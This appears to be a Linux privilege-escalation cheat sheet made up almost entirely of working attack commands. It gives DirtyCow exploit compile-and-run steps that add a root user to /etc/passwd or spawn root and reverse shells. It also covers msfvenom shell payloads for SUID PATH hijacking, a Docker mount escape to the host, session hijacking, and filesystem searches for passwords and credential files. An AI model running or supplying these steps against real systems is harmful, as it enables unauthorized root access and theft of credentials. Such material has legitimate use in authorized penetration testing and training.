# automate search for vulnerabilities
https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh  
https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh  

# DirtyCow
```
# vulnerable kernel versions: 2.6.22 - 4.8.3, 4.7.9, 4.4.26
uname -a
```

## compile on target 40611.c
```
gcc -pthread 40611.c -o dirtyc0w
```

### add new user and password to /etc/passwd
```
./dirtyc0w /etc/passwd "<user>:$(openssl passwd -1 -salt <user> <password>):0:0:root:/bin/bash" &
```

### change to root shell
```
su <user>
```

## compile on target 40839.c
```
gcc -pthread 40839.c -o dirty -lcrypt
```

### append new user to /etc/passwd
```
./dirty <password> /etc/passwd
```

### change to root shell
```
su firefart
```

## (un)comment correct payload first (x86 or x64) - compile on target 
```
https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c
gcc cowroot.c -o cowroot -pthread
```

### pop root shell
```
./cowroot
```

### disable dirty writeback may prevent machine from crash
```
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
```

### compile on target 40847.cpp
```
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
```

### pop reverse shell (automatically disable dirty writeback)
```
./dcow -s
```


# Password Mining
## information about current user
```
id || (whoami && groups) 2>/dev/null
```

## get all local user
```
cat /etc/passwd | cut -d ":" -f 1
```

## get all superuser
```
awk -F: '($3 == "0") {print}' /etc/passwd 
```

## search for passwords
```
grep -lRi "password" /home /var/www /var/log 2> /dev/null | sort | uniq
```

## check interesting files
```
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/
```

## find interesting files
```
find / -type f -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml"  2>/dev/null
```

## list gpg keys
```
gpg --list-keys
```


# SUID Binaries
## find SUID enabled files 
```
find / -perm -u=s -type f 2>/dev/null
find / -perm +4000 -type f 2>/dev/null
```

## find SGID enabled files
```
find / -perm /2000 -ls 2>/dev/null
find / -perm +8000 -ls 2>/dev/null
```

## search on
https://gtfobins.github.io  

## if unusual binary has SUID set, check for script calls without absolute path
```
strings <binary>
```

## generate shell
```
msfvenom -p linux/x86/exec CMD=/bin/sh -f elf -o <file>
msfvenom -p linux/x64/exec CMD=/bin/sh -f elf -o <file>
```

## download to /tmp and set execution bit
```
chmod 755 <file>
```

## set new environment variable and execute unusual binary
```
export PATH=/tmp:$PATH
```


# Sudo
## show all available sudo commands
```
sudo -l
```

## list all sudoers
```
grep '^sudo:.*$' /etc/group | cut -d: -f4
```

## check if specific user has sudo rights - proceed in analogy to suid
```
sudo -l -U sk
```


# Cron and File Permissions
## look for cronjobs
```
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
grep "CRON" /var/log/cron.log
```

## check for initd files
```
ls -l /etc/init.d
```

## list timers
```
systemctl list-timers --all
```

## find world writeable files
```
find / -path /proc -prune -o -perm -2 ! -type l -ls 2> /dev/null
```

## directories that are writeable by user
```
find / -writable -type d ! -type l -ls 2>/dev/null
```

## find nobody files - create new user with the same UID to inherit this files
```
find / -path /proc -prune -o -nouser -o -nogroup 2> /dev/null
```


# running sessions
## check for screen sessions
```
screen -ls
screen -dr <session> 
```

## check for tmux sessions
```
tmux ls
tmux a -t <sessions>
```


# Docker
## search socket for docker
```
find / -name docker.sock 2>/dev/nul
```

## list docker images 
```
docker images
```

## run the image, mounting the host disk and chroot
```
docker run -it -v /:/host/ <dockerImage> chroot /host/ bash
```


# Kernel Exploits
## get kernel version
```
uname -a
cat /etc/issue
cat /etc/*-release
cat /proc/version
```

## list kernel modules
```
lsmod
/sbin/modinfo <module>
```

## check kernel versions for exploits
```
bash /usr/share/linux-exploit-suggester/linux-exploit-suggester.sh -u <uname -a> 
searchsploit linux kernel <version> 
https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md  
```

## precompiled exploits
https://github.com/SecWiki/linux-kernel-exploits  

